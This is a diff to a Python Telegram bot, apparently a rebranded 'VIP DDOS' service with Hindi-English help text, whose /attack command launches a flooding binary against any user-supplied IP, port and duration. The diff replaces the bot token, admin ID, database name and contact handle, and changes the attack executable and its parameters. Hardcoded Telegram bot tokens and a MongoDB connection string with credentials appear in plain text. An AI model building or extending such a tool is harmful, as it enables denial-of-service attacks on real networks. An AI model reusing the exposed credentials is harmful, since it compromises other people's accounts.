@@ -9,10 +9,10 @@ attack_in_progress = False
 current_attack = None  # Store details of the current attack
 attack_history = []  # Store attack logs
 
-TELEGRAM_BOT_TOKEN = '7747879674:AAFBTmfc5UHLAbFSeUAEKxpbiE2CPwya8dI'
-ADMIN_USER_ID = 1944182800
+TELEGRAM_BOT_TOKEN = '7379603984:AAHHuW30X3d-ZVXNMM6AQ-rPE1Ft7fMtZ0s'
+ADMIN_USER_ID = 1300081723
 MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
-DB_NAME = "dake"
+DB_NAME = "sarkar"
 COLLECTION_NAME = "users"
 attack_in_progress = False
 ATTACK_TIME_LIMIT = 240  # Maximum attack duration in seconds
@@ -50,7 +50,7 @@ async def start(update: Update, context: CallbackContext):
         "*⚠️ Kaise Use Kare? ⚠️*\n"
         "*Commands ka use karo aur commands ka pura list dekhne ke liye type karo: /help*\n\n"
         "*💬 Queries or Issues? 💬*\n"
-        "*Contact Admin: @DAKUBhaiZz*"
+        "*Contact Admin: @Sarkar3009*"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
     
@@ -181,7 +181,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./soul {ip} {port} {duration} {900}"
+        command = f"./daku {ip} {port} {duration} {200} {1000}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
@@ -239,7 +239,7 @@ async def myinfo(update: Update, context: CallbackContext):
 async def help(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*🛠️ DAKU VIP DDOS Bot Help Menu 🛠️*\n\n"
+        "*🛠️ SARKAR VIP DDOS Bot Help Menu 🛠️*\n\n"
         "🌟 *Yahan hai sab kuch jo tumhe chahiye!* 🌟\n\n"
         "📜 *Available Commands:* 📜\n\n"
         "1️⃣ *🔥 /attack <ip> <port> <duration>*\n"
@@ -255,7 +255,7 @@ async def help(update: Update, context: CallbackContext):
         "   - *Ab ye toh tum already use kar rahe ho! Yeh command bot ke saare features explain karta hai.*\n\n"
         "🚨 *𝐈𝐦𝐩𝐨𝐫𝐭𝐚𝐧𝐭 𝐓𝐢𝐩𝐬:* 🚨\n"
         "- *BOT REPLY NAA DE ISKA MATLAB KOI AUR BNDA ATTACK LAGYA HAI SO WAIT.*\n"
-        "- *Agar koi dikkat aaye toh admin ko contact karo: @DAKUBhaiZz*\n\n"
+        "- *Agar koi dikkat aaye toh admin ko contact karo: @Sarkar3009*\n\n"
         "💥 *Ab jao aur hacker banne ka natak shuru karo!* 💥"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
